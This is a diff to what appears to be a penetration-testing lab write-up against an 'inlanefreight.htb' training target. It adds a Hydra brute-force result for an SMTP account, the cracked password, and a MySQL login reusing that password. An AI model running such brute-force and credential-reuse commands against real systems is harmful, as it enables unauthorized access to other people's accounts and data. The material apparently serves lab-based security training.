@@ -481,3 +481,12 @@ I attempted a brute-force attack on the SMTP service using Hydra with the follow
 hydra -l fiona@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt -t 64 -f 10.129.81.81 smtp
 ```
 
+1 valid password was found: 
+```bash
+[25][smtp] host: 10.129.54.106   login: fiona@inlanefreight.htb   password: 987654321
+```
+Now I attempted to login to the MySQL Service with the command:
+
+```bash
+mysql -u fiona -p987654321 -h 10.129.54.106 --skip-ssl
+```
